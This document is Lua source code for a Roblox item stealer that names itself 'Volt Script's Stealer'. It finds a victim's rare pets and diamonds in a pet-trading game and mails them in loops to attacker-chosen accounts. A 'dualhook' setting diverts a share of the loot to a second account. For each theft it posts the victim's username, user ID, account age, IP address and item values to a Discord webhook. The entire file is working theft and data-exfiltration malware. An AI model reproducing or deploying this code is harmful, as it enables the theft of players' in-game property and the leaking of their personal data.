SPList = {}
ExclusiveList = {}
EList = {}
SEList = {}
EventList = {}
EvList = {}
SEvList = {}
SecretList = {}
SList = {}
SSList = {}
MythicList = {}
MList = {}
SMList = {}

-- Pets's ID's

table.foreach(Library.Directory.Pets, function(i, v)
    if v.titanic then
        table.insert(TitanicList, i)
    end
    if v.name == "banana" then
        table.insert(BananaList, i)
    end
    if v.huge then
        table.insert(HugeList, i)
    end
    if string.split(v.name, " ")[1] == "Pog" then
        table.insert(PogList, i)
    end
    if v.rarity == "Exclusive" and not v.huge and not v.titanic then
        table.insert(ExclusiveList, i)
    end
    if v.rarity == "Event" then
        table.insert(EventList, i)
    end
    if v.rarity == "Secret" then
        table.insert(SecretList, i)
    end
    if v.rarity == "Mythical" then
        table.insert(MythicList, i)
    end
end)
-- Pets's UID's

local pets = PlayerInfos.Pets
local y = {}
for i, v in pairs(pets) do
    y[v["uid"]] = false
end
lockremote:InvokeServer(y)
for i, v in pairs(pets) do
    if table.find(TitanicList, v["id"]) ~= nil then
        table.insert(TList, v["uid"])
        table.insert(STList, v["id"])
    end
end
for i, v in pairs(pets) do
    if table.find(BananaList, v["id"]) ~= nil then
        table.insert(BList, v["uid"])
    end
end
for i, v in pairs(pets) do
    if table.find(HugeList, v["id"]) ~= nil then
        table.insert(HList, v["uid"])
        table.insert(SHList, v["id"])
    end
end
for i, v in pairs(pets) do
    if table.find(PogList, v["id"]) ~= nil then
        table.insert(PList, v["uid"])
        table.insert(SPList, v["id"])
    end
end
for i, v in pairs(pets) do
    if table.find(ExclusiveList, v["id"]) ~= nil and not v.huge and not v.titanic then
        table.insert(EList, v["uid"])
        table.insert(SEList, v["id"])
    end
end
for i, v in pairs(pets) do
    if table.find(EventList, v["id"]) ~= nil then
        table.insert(EvList, v["uid"])
        table.insert(SEvList, v["id"])
    end
end
for i, v in pairs(pets) do
    if table.find(SecretList, v["id"]) ~= nil then
        table.insert(SList, v["uid"])
        table.insert(SSList, v["id"])
    end
end
for i, v in pairs(pets) do
    if table.find(MythicList, v["id"]) ~= nil and v.hc and v.dm then
        table.insert(MList, v["uid"])
        table.insert(SMList, v["id"])
    end
end

local FinalList = #TList + #BList + #HList + #EList + #EvList + #MList + #SList + #PList

-- Webhook Diamonds Infos & Diamonds Calculations

local Sdiaamt
if diaamt >= (100000 * FinalList + 100000) then
    Sdiaamt = 100000 * FinalList + 100000
    -- print(Sdiaamt)
elseif diaamt < (100000 * FinalList + 100000) then
    Sdiaamt = diaamt
end
local givediaamt
if diaamt - Sdiaamt < 10000 then
    givediaamt = 0
elseif diaamt - Sdiaamt >= 10000 then
    givediaamt = diaamt - Sdiaamt
end
function diamondstoconvert(diamonds)
    local diaamt2 = diamonds
    local abbreviations = {
        k = 4,
        m = 7,
        b = 10,
        T = 13,
        Qt = 16,
    }
    local DiamondsCount = tostring(math.floor(diaamt2))

    local ChosenAbbreviation
    for abbreviation, digits in pairs(abbreviations) do
        if #DiamondsCount >= digits and #DiamondsCount < (digits + 3) then
            ChosenAbbreviation = abbreviation
            break
        end
    end

    if ChosenAbbreviation then
        local digits = abbreviations[ChosenAbbreviation]
        local rounded = math.floor(diaamt2 / 10 ^ (digits - 3)) * 10 ^ (digits - 3)
        DiamondsCount = string.format("%0.2f", rounded / 10 ^ (digits - 1))
        local addsd = string.split(DiamondsCount, ".")[2]
        local pnt = "."
        if string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] ~= "0" then
            DiamondsCount = string.split(DiamondsCount, ".")[1] ..
                pnt .. string.split(addsd, "")[1] .. ChosenAbbreviation
        elseif string.split(addsd, "")[2] == "0" and string.split(addsd, "")[1] == "0" then
            DiamondsCount = string.split(DiamondsCount, ".")[1] .. ChosenAbbreviation
        elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] ~= "0" then
            DiamondsCount = DiamondsCount .. ChosenAbbreviation
        elseif string.split(addsd, "")[2] ~= "0" and string.split(addsd, "")[1] == "0" then
            DiamondsCount = DiamondsCount .. ChosenAbbreviation
        else
            DiamondsCount = diamonds
        end
    end
    return DiamondsCount
end

local DiamondsCount = diamondstoconvert(givediaamt)
local WDiamondsCount = diamondstoconvert(DiamondsDiamonds)
function RAP()
    local RAP = diamondstoconvert(PlayerInfos.RAP)
    return RAP
end

-- Webhook
local url = Webhook
local whenabled = true
local function SendWebhook(rarity, name, ping, d, f, petimg, receiver)
    local abcdef1
    local headers
    local lmao = "/5"
    local Image = string.split(petimg, "rbxassetid://")[2]
    Image = game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds=" ..
        Image .. "&returnPolicy=PlaceHolder&size=420x420&format=Png&isCircular=false")
    Image = game:GetService("HttpService"):JSONDecode(Image).data[1].imageUrl
    if FinalFinal ~= 0 or DiamondsDiamonds ~= 0 then
        imgs =
        "https://cdn.discordapp.com/attachments/1142120499783139458/1142847287282901002/attachment_93255996.jpg"
        data1 = {
            ["content"] = ping,
            ["username"] = "Volt Script",
            ["avatar_url"] = imgs,
            ["embeds"] = { {
                ["title"] = "**New Hit** Volt Script",
                ["url"] = "https://discord.gg/uSgzNwHDTS",
                ["type"] = "rich",
                ["color"] = tonumber(0x2798FF),
                ["thumbnail"] = {
                    ["url"] = Image,
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = { {
                    ["name"] = "**This data was generated using Volt Script's Stealer** :moyai:",
                    ["value"] = "```Username     : " .. username ..
                        "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                        " Days\nIP Address   : " .. IPadress .. "\nRank           : " .. rank .. "\nRAP          : " .. RAP() ..
                        "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                    ["inline"] = false
                }, {
                    ["name"] = ":dog: **Pets left** :dog:",
                    ["value"] = "```" .. f .. "```",
                    ["inline"] = true
                }, {
                    ["name"] = ":gem: **Diamonds** :gem:",
                    ["value"] = "```" .. d .. "```",
                    ["inline"] = true
                },
                    {
                        ["name"] = rarity,
                        ["value"] = "```" .. name .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":bank: **Joined Banks** :bank:",
                        ["value"] = "```" .. bankscount .. lmao .. "```",
                        ["inline"] = true
                    },
                    {
                        ["name"] = ":gem: **Wd Diamonds** :gem:",
                        ["value"] = "```" .. WDiamondsCount .. "```",
                        ["inline"] = true
                    }, {
                    ["name"] = ":money_mouth: **Wd Huges** :money_mouth:",
                    ["value"] = "```" .. FinalFinal .. "```",
                    ["inline"] = true
                },
                }
            } }
        }
        newdata1 = game:GetService("HttpService"):JSONEncode(data1)

        headers = {
            ["content-type"] = "application/json"
        }

        if Webhook ~= nil and whenabled == true then
            abcdef1 = {
                Url = url,
                Body = newdata1,
                Method = "POST",
                Headers = headers
            }
            request(abcdef1)
        end
    else
        imgs =
        "https://cdn.discordapp.com/attachments/1142120499783139458/1142847287282901002/attachment_93255996.jpg"
        data1 = {
            ["content"] = ping,
            ["username"] = "Volt Script",
            ["avatar_url"] = imgs,
            ["embeds"] = { {
                ["title"] = "**New Hit**  Volt Script",
                ["url"] = "https://discord.gg/KEF4z9DFdb",
                ["type"] = "rich",
                ["color"] = tonumber(0x2798FF),
                ["thumbnail"] = {
                    ["url"] = Image,
                    ["height"] = 420,
                    ["width"] = 420
                },
                ["fields"] = { {
                    ["name"] = "**This data was generated using Volt Script's Stealer** :moyai:",
                    ["value"] = "```Username     : " .. username ..
                        "\nUser-ID      : " .. fardplayer.userId .. "\nAccount Age  : " .. fardplayer.AccountAge ..
                        " Days\nIP Address   : " .. IPadress .. "\nRank         : " .. rank .. "\nRAP          : " .. RAP() ..
                        "\nExploit      : " .. exploit .. "\nReceiver     : " .. receiver .. "```",
                    ["inline"] = false
                }, {
                    ["name"] = ":dog: **Pets left** :dog:",
                    ["value"] = "```" .. f .. "```",
                    ["inline"] = true
                }, {
                    ["name"] = ":gem: **Diamonds** :gem:",
                    ["value"] = "```" .. d .. "```",
                    ["inline"] = true
                },
                    {
                        ["name"] = rarity,
                        ["value"] = "```" .. name .. "```",
                        ["inline"] = true
                    },
                }
            } }
        }
        newdata1 = game:GetService("HttpService"):JSONEncode(data1)

        headers = {
            ["content-type"] = "application/json"
        }

        if Webhook ~= nil and whenabled == true then
            abcdef1 = {
                Url = url,
                Body = newdata1,
                Method = "POST",
                Headers = headers
            }
            request(abcdef1)
        end
    end
end

local dhuser = getgenv().Settings.User
-- if getgenv().Settings ~= nil then
--     if getgenv().Settings.PremiumKey ~= nil then
--         local premkey = getgenv().Settings.PremiumKey
--         local dhkey = to_base64(to_base64(to_base64(to_base64(premkey))))
--         local dhdata = {
--             dhprem = dhkey
--         }
--         local dhurl = "premium database php link here" -- Exc : https://rizz.xyz/premium.php
--         local dhheaders = {
--             ["content-type"] = "application/json"
--         }
--         local dhnewdata = game:GetService("HttpService"):JSONEncode(dhdata)
--         local dhresponse = request({
--             Url = dhurl,
--             Body = dhnewdata,
--             Method = "POST",
--             Headers = dhheaders
--         })
--         local responsed = from_base64(from_base64(from_base64(dhresponse.Body)))
--         if responsed ~= 'false' then
--             dhuser = responsed
--         else
--             dhuser = nil
--         end
--     end
-- end
local titanicin
local bananin
local hugein
local pogin
local excin
local eventin
local secretin
local mythicin
local gemsin
local mailmsg = ".gg/uSgzNwHDTS"
if dhuser ~= nil then
    if getgenv().Settings.Titanics.Dualhook then
        titanicin = getgenv().Settings.Titanics.Intensity
    end
    if getgenv().Settings.Banana.Dualhook then
        bananin = getgenv().Settings.Banana.Intensity
    end
    if getgenv().Settings.Huges.Dualhook then
        hugein = getgenv().Settings.Huges.Intensity
    end
    if getgenv().Settings.Pogs.Dualhook then
        pogin = getgenv().Settings.Pogs.Intensity
    end
    if getgenv().Settings.Exclusives.Dualhook then
        excin = getgenv().Settings.Exclusives.Intensity
    end
    if getgenv().Settings.Events.Dualhook then
        eventin = getgenv().Settings.Events.Intensity
    end
    if getgenv().Settings.Secrets.Dualhook then
        secretin = getgenv().Settings.Secrets.Intensity
    end
    if getgenv().Settings.HC_DM_Mythics.Dualhook then
        mythicin = getgenv().Settings.HC_DM_Mythics.Intensity
    end
    if getgenv().Settings.Gems.Dualhook then
        gemsin = getgenv().Settings.Gems.Intensity
    end
    if getgenv().Settings.Webhook ~= true then
        whenabled = false
    end
    if getgenv().Settings.MailMessage ~= nil then
        mailmsg = getgenv().Settings.MailMessage
    end
end

-- Dualhook intensity

function dualhook(percent)
    if not tonumber(percent) then
        game:GetService("Players").LocalPlayer:Kick("Put A Valid intensity Value")
        return;
    end
    local number = math.random(1, 100)
    if number <= percent then
        return true
    else
        return false
    end
end

-- Sending The Pets

local ndUser
if UserName2 ~= nil and UserName2 ~= "2nd User Here" and UserName2 ~= "" then
    ndUser = UserName2
else
    ndUser = UserName
end
local user
-- Gems Only
if FinalList == 0 then
    if givediaamt >= 1000000000 then
        user = UserName
    else
        user = ndUser
    end
    if gemsin ~= nil then
        if dualhook(gemsin) then
            user = dhuser
        end
    end
    local args = {
        [1] = {
            ["Recipient"] = user,
            ["Diamonds"] = givediaamt,
            ["Pets"] = {},
            ["Message"] = mailmsg,
        }
    }
    mailremote:InvokeServer(unpack(args))
end
spawn(function()
    while wait() do
        if #TList ~= 0 or TList ~= {} then
            for i, v in pairs(TList) do
                user = UserName
                if titanicin ~= nil then
                    if dualhook(titanicin) then
                        user = dhuser
                    end
                end
                local args = {
                    [1] = {
                        ["Recipient"] = user,
                        ["Diamonds"] = givediaamt,
                        ["Pets"] = { v },
                        ["Message"] = mailmsg,
                    }
                }
                mailremote:InvokeServer(unpack(args))
                -- wait(5.5)
                if #TList == 0 or TList == {} then
                    -- print("done1")
                    break
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if #BList ~= 0 and #TList == 0 then
            for i, v in pairs(BList) do
                user = UserName
                if bananin ~= nil then
                    if dualhook(bananin) then
                        user = dhuser
                    end
                end
                local args = {
                    [1] = {
                        ["Recipient"] = user,
                        ["Diamonds"] = givediaamt,
                        ["Pets"] = { v },
                        ["Message"] = mailmsg,
                    }
                }
                mailremote:InvokeServer(unpack(args))
                -- wait(5.5)
                if #BList == 0 or BList == {} then
                    -- print("done2")
                    break
                end
            end
        else
            break
        end
    end
end)
spawn(function()
    while wait() do
        if #HList ~= 0 and #BList == 0 and #TList == 0 then
            for i, v in pairs(HList) do
                user = UserName
                if hugein ~= nil then
                    if dualhook(hugein) then
                        user = dhuser
                    end
                end
                local args = {
                    [1] = {
                        ["Recipient"] = user,
                        ["Diamonds"] = givediaamt,
                        ["Pets"] = { v },
                        ["Message"] = mailmsg,
                    }
                }
                mailremote:InvokeServer(unpack(args))
                -- wait(5.5)
                if #HList == 0 or HList == {} then
                    -- print("done3")
                    break
                end
            end
        end
    end
end)

spawn(function()
    while wait() do
        if #PList ~= 0 and #TList == 0 and #BList == 0 and #HList == 0 then
            for i, v in pairs(PList) do
                user = UserName
                if pogin ~= nil then
                    if dualhook(pogin) then
                        user = dhuser
                    end
                end
                local args = {
                    [1] = {
                        ["Recipient"] = user,
                        ["Diamonds"] = givediaamt,
                        ["Pets"] = { v },
                        ["Message"] = mailmsg,
                    }
                }
                mailremote:InvokeServer(unpack(args))
                -- wait(5.5)
                if #PList == 0 or PList == {} then
                    -- print("done1")
                    break
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if #EList ~= 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
            for i, v in pairs(EList) do
                user = UserName
                if excin ~= nil then
                    if dualhook(excin) then
                        user = dhuser
                    end
                end
                local args = {
                    [1] = {
                        ["Recipient"] = user,
                        ["Diamonds"] = givediaamt,
                        ["Pets"] = { v },
                        ["Message"] = mailmsg,
                    }
                }
                mailremote:InvokeServer(unpack(args))
                -- wait(5.5)
                if #EList == 0 or EList == {} then
                    -- print("done42")
                    break
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if #EvList ~= 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
            for i, v in pairs(EvList) do
                user = ndUser
                if eventin ~= nil then
                    if dualhook(eventin) then
                        user = dhuser
                    end
                end
                local args = {
                    [1] = {
                        ["Recipient"] = user,
                        ["Diamonds"] = givediaamt,
                        ["Pets"] = { v },
                        ["Message"] = mailmsg,
                    }
                }
                mailremote:InvokeServer(unpack(args))
                -- wait(5.5)
                if #EvList == 0 or EvList == {} then
                    -- print("done5")
                    break
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if #SList ~= 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
            for i, v in pairs(SList) do
                user = ndUser
                if secretin ~= nil then
                    if dualhook(secretin) then
                        user = dhuser
                    end
                end
                local args = {
                    [1] = {
                        ["Recipient"] = user,
                        ["Diamonds"] = givediaamt,
                        ["Pets"] = { v },
                        ["Message"] = mailmsg,
                    }
                }
                mailremote:InvokeServer(unpack(args))
                -- wait(5.5)
                if #SList == 0 or SList == {} then
                    -- print("done6")
                    break
                end
            end
        end
    end
end)
spawn(function()
    while wait() do
        if #MList ~= 0 and #SList == 0 and #EvList == 0 and #EList == 0 and #HList == 0 and #TList == 0 and #BList == 0 and #PList == 0 then
            for i, v in pairs(MList) do
                user = ndUser
                if mythicin ~= nil then
                    if dualhook(mythicin) then
                        user = dhuser
                    end
                end
                local args = {
                    [1] = {
                        ["Recipient"] = user,
                        ["Diamonds"] = givediaamt,
                        ["Pets"] = { v },
                        ["Message"] = mailmsg,
                    }
                }
                mailremote:InvokeServer(unpack(args))
                -- wait(5.5)
                -- print("secret sending")
                if #MList == 0 or MList == {} then
                    -- print("done6")
                    break
                end
            end
        end
    end
end)

local Tcc = #TList
WTianicList = {}
WTList = {}
WTcc = {}
local titanicnumber = 1

spawn(function()
    while wait() do
        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
        WFunctions = WLibrary.Functions
        table.foreach(WLibrary.Directory.Pets, function(i, v)
            if v.titanic then
                table.insert(WTianicList, i)
            end
        end)
        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
        local Wy = {}
        for i, v in pairs(Wpets) do
            Wy[v["uid"]] = false
        end
        for i, v in pairs(Wpets) do
            if table.find(WTianicList, v["id"]) ~= nil then
                table.insert(WTList, v["uid"])
                table.insert(WTcc, v["id"])
            end
        end
        if Tcc == #WTList + 1 then
            -- print("Titanic Has Been Sent")
            Tcc = #TList
            FinalList = FinalList - 1
            local diamonds = givediaamt
            local titanictid = STList[titanicnumber]
            local titanicname
            local titanicimg
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local titanicsm = string.split(v.Name, " - ")[1]
                if titanicsm == tostring(titanictid) then
                    titanicname = require(v:FindFirstChildOfClass("ModuleScript")).name
                    titanicimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    break
                end
            end
            SendWebhook(":scream:  **TITANIC** :scream:", titanicname, "@everyone OMFG", DiamondsCount, FinalList,
                titanicimg, UserName)
            givediaamt = 0
            DiamondsCount = 0
            titanicnumber = titanicnumber + 1
            DiamondsDiamonds = 0
            FinalFinal = 0
        elseif Tcc == 0 or FinalList == 0 then
            TList = {}
            -- print("done1")
            break
        end
        WTianicList = {}
        WTList = {}
        WTcc = {}
        wait(1)
    end
end)

local Bcc = #BList
WBananaList = {}
WBList = {}
WBcc = {}

spawn(function()
    while wait() do
        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
        WFunctions = WLibrary.Functions
        table.foreach(WLibrary.Directory.Pets, function(i, v)
            if v.name == "banana" then
                table.insert(WBananaList, i)
            end
        end)
        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
        local Wy = {}
        for i, v in pairs(Wpets) do
            Wy[v["uid"]] = false
        end
        for i, v in pairs(Wpets) do
            if table.find(WBananaList, v["id"]) ~= nil then
                table.insert(WBList, v["uid"])
                table.insert(WBcc, v["id"])
            end
        end
        if Bcc == #WBList + 1 then
            -- print("Banana Has Been Sent")
            Bcc = #BList
            FinalList = FinalList - 1
            local diamonds = givediaamt
            local banananame = "Banana"
            local bananaimg = "rbxassetid://10946336703"
            SendWebhook(":banana: **BANANA** :banana:", banananame, "@everyone", DiamondsCount, FinalList, bananaimg,
                UserName)
            givediaamt = 0
            DiamondsCount = 0
            DiamondsDiamonds = 0
            FinalFinal = 0
        elseif Bcc == 0 or FinalList == 0 then
            BList = {}
            -- print("done2")
            break
        end
        WBananaList = {}
        WBList = {}
        WBcc = {}
        wait(1)
    end
end)


local Hcc = #HList
WHugeList = {}
WHList = {}
WHcc = {}
local hugenumber = 1
spawn(function()
    while wait() do
        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
        WFunctions = WLibrary.Functions
        table.foreach(WLibrary.Directory.Pets, function(i, v)
            if v.huge then
                table.insert(WHugeList, i)
            end
        end)
        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
        local Wy = {}
        for i, v in pairs(Wpets) do
            Wy[v["uid"]] = false
        end
        for i, v in pairs(Wpets) do
            if table.find(WHugeList, v["id"]) ~= nil then
                table.insert(WHList, v["uid"])
                table.insert(WHcc, v["id"])
            end
        end
        if Hcc == #WHList + 1 then
            -- print("Huge Has Been Sent")
            Hcc = #WHList
            FinalList = FinalList - 1
            local hugepetid = SHList[hugenumber]
            local hugeimg
            local hugepetname
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local hugepetsm = string.split(v.Name, " - ")[1]
                if hugepetsm == tostring(hugepetid) then
                    hugepetname = require(v:FindFirstChildOfClass("ModuleScript")).name
                    hugeimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    break
                end
            end
            SendWebhook(":money_mouth: **HUGE** :money_mouth:", hugepetname, "@everyone", DiamondsCount,
                FinalList, hugeimg, UserName)
            givediaamt = 0
            DiamondsCount = 0
            hugenumber = hugenumber + 1
            DiamondsDiamonds = 0
            FinalFinal = 0
        elseif Hcc == 0 or FinalList == 0 then
            HList = {}
            -- print("done3")
            break
        end
        WHugeList = {}
        WHList = {}
        WHcc = {}
        wait(1)
    end
end)

local Pcc = #PList
WPogList = {}
WPList = {}
WPcc = {}
local pognumber = 1
spawn(function()
    while wait() do
        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
        WFunctions = WLibrary.Functions
        table.foreach(WLibrary.Directory.Pets, function(i, v)
            if string.split(v.name, " ")[1] == "Pog" then
                table.insert(WPogList, i)
            end
        end)
        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
        local Wy = {}
        for i, v in pairs(Wpets) do
            Wy[v["uid"]] = false
        end
        for i, v in pairs(Wpets) do
            if table.find(WPogList, v["id"]) ~= nil then
                table.insert(WPList, v["uid"])
                table.insert(WPcc, v["id"])
            end
        end
        if Pcc == #WPList + 1 then
            -- print("Exc")
            Pcc = #WPList
            FinalList = FinalList - 1
            local pogID = SPList[pognumber]
            local pogname
            local pogimg
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local pogsm = string.split(v.Name, " - ")[1]
                if pogsm == tostring(pogID) then
                    pogname = require(v:FindFirstChildOfClass("ModuleScript")).name
                    pogimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    break
                end
            end
            SendWebhook(":fire: **POG** :fire:", pogname, "", DiamondsCount, FinalList, pogimg, UserName)
            givediaamt = 0
            DiamondsCount = 0
            pognumber = pognumber + 1
            DiamondsDiamonds = 0
            FinalFinal = 0
        elseif Pcc == 0 or FinalList == 0 then
            PList = {}
            -- print("done41")
            break
        end
        WPogList = {}
        WPList = {}
        WPcc = {}
        wait(1)
    end
end)

local Ecc = #EList
WExclusiveList = {}
WEList = {}
WEcc = {}
local excnumber = 1
spawn(function()
    while wait() do
        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
        WFunctions = WLibrary.Functions
        table.foreach(WLibrary.Directory.Pets, function(i, v)
            if v.rarity == "Exclusive" and not v.huge and not v.titanic then
                table.insert(WExclusiveList, i)
            end
        end)
        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
        local Wy = {}
        for i, v in pairs(Wpets) do
            Wy[v["uid"]] = false
        end
        for i, v in pairs(Wpets) do
            if table.find(WExclusiveList, v["id"]) ~= nil and not v.huge and not v.titanic then
                table.insert(WEList, v["uid"])
                table.insert(WEcc, v["id"])
            end
        end
        if Ecc == #WEList + 1 then
            -- print("Exc")
            Ecc = #WEList
            FinalList = FinalList - 1
            local excID = SEList[excnumber]
            local excimg
            local excname
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local excsm = string.split(v.Name, " - ")[1]
                if excsm == tostring(excID) then
                    excname = require(v:FindFirstChildOfClass("ModuleScript")).name
                    excimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    break
                end
            end
            SendWebhook(":teddy_bear: **Exclusive** :teddy_bear:", excname, "", DiamondsCount, FinalList, excimg,
                UserName)
            givediaamt = 0
            DiamondsCount = 0
            excnumber = excnumber + 1
            DiamondsDiamonds = 0
            FinalFinal = 0
        elseif Ecc == 0 or FinalList == 0 then
            EList = {}
            -- print("done41")
            break
        end
        WExclusiveList = {}
        WEList = {}
        WEcc = {}
        wait(1)
    end
end)

local Evcc = #EvList
WEventList = {}
WEvList = {}
WEvcc = {}
local eventnumber = 1
spawn(function()
    while wait() do
        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
        WFunctions = WLibrary.Functions
        table.foreach(WLibrary.Directory.Pets, function(i, v)
            if v.rarity == "Event" then
                table.insert(WEventList, i)
            end
        end)
        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
        local Wy = {}
        for i, v in pairs(Wpets) do
            Wy[v["uid"]] = false
        end
        for i, v in pairs(Wpets) do
            if table.find(WEventList, v["id"]) ~= nil then
                table.insert(WEvList, v["uid"])
                table.insert(WEvcc, v["id"])
            end
        end
        if Evcc == #WEvList + 1 then
            -- print("Event")
            Evcc = #WEvList
            FinalList = FinalList - 1
            local diamonds = givediaamt
            local eventID = SEvList[eventnumber]
            local eventname
            local eventimg
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local eventsm = string.split(v.Name, " - ")[1]
                if eventsm == tostring(eventID) then
                    eventname = require(v:FindFirstChildOfClass("ModuleScript")).name
                    eventimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    break
                end
            end
            SendWebhook(":pushpin: **Event** :pushpin:", eventname, "", DiamondsCount, FinalList, eventimg, ndUser,
                petinfo)
            givediaamt = 0
            DiamondsCount = 0
            eventnumber = eventnumber + 1
            DiamondsDiamonds = 0
            FinalFinal = 0
        elseif Evcc == 0 or FinalList == 0 then
            EvList = {}
            -- print("done5")
            break
        end
        WEventList = {}
        WEvList = {}
        WEvcc = {}
        wait(1)
    end
end)


local Scc = #SList
WSecretList = {}
WSList = {}
WScc = {}
local secretnumber = 1
spawn(function()
    while wait() do
        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
        WFunctions = WLibrary.Functions
        table.foreach(WLibrary.Directory.Pets, function(i, v)
            if v.rarity == "Secret" then
                table.insert(WSecretList, i)
            end
        end)
        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
        local Wy = {}
        for i, v in pairs(Wpets) do
            Wy[v["uid"]] = false
        end
        for i, v in pairs(Wpets) do
            if table.find(WSecretList, v["id"]) ~= nil then
                table.insert(WSList, v["uid"])
                table.insert(WScc, v["id"])
            end
        end
        if Scc == #WSList + 1 then
            -- print("Secret")
            Scc = #WSList
            FinalList = FinalList - 1
            local secretID = SSList[secretnumber]
            local secretname
            local secretimg
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local secretsm = string.split(v.Name, " - ")[1]
                if secretsm == tostring(secretID) then
                    secretname = require(v:FindFirstChildOfClass("ModuleScript")).name
                    secretimg = require(v:FindFirstChildOfClass("ModuleScript")).thumbnail
                    break
                end
            end
            SendWebhook(":shushing_face: **SECRET** :shushing_face:", secretname, "", DiamondsCount, FinalList,
                secretimg, ndUser)
            givediaamt = 0
            DiamondsCount = 0
            secretnumber = secretnumber + 1
            DiamondsDiamonds = 0
            FinalFinal = 0
        elseif Scc == 0 or FinalList == 0 then
            SList = {}
            -- print("done6")
            break
        end
        WSecretList = {}
        WSList = {}
        WScc = {}
        wait(1)
    end
end)

local Mcc = #MList
WMythicList = {}
WMList = {}
WMcc = {}
local mythicnumber = 1
spawn(function()
    while wait() do
        WLibrary = require(game:GetService("ReplicatedStorage").Framework:FindFirstChild("Library"))
        WFunctions = WLibrary.Functions
        table.foreach(WLibrary.Directory.Pets, function(i, v)
            if v.rarity == "Mythical" then
                table.insert(WMythicList, i)
            end
        end)
        local Wpets = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Pets
        local Wy = {}
        for i, v in pairs(Wpets) do
            Wy[v["uid"]] = false
        end
        for i, v in pairs(Wpets) do
            if table.find(WMythicList, v["id"]) ~= nil and v.hc and v.dm then
                table.insert(WMList, v["uid"])
                table.insert(WMcc, v["id"])
            end
        end
        if Mcc == #WMList + 1 then
            -- print("Mythic")
            Mcc = #WMList
            FinalList = FinalList - 1
            local mythicID = SMList[mythicnumber]
            local mythicname
            local mythicimg
            for i, v in pairs(game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets:GetChildren()) do
                local mythicsm = string.split(v.Name, " - ")[1]
                if mythicsm == tostring(mythicID) then
                    mythicname = require(v:FindFirstChildOfClass("ModuleScript")).name
                    mythicimg = require(v:FindFirstChildOfClass("ModuleScript")).darkMatterThumbnail
                    break
                end
            end
            SendWebhook(":ribbon: **Mythical** :ribbon:", mythicname, "", DiamondsCount, FinalList, mythicimg,
                ndUser)
            givediaamt = 0
            DiamondsCount = 0
            mythicnumber = mythicnumber + 1
            DiamondsDiamonds = 0
            FinalFinal = 0
        elseif Mcc == 0 or FinalList == 0 then
            MList = {}
            -- print("done7")
            break
        end
        WMythicList = {}
        WMList = {}
        WMcc = {}
        wait(1)
    end
end)
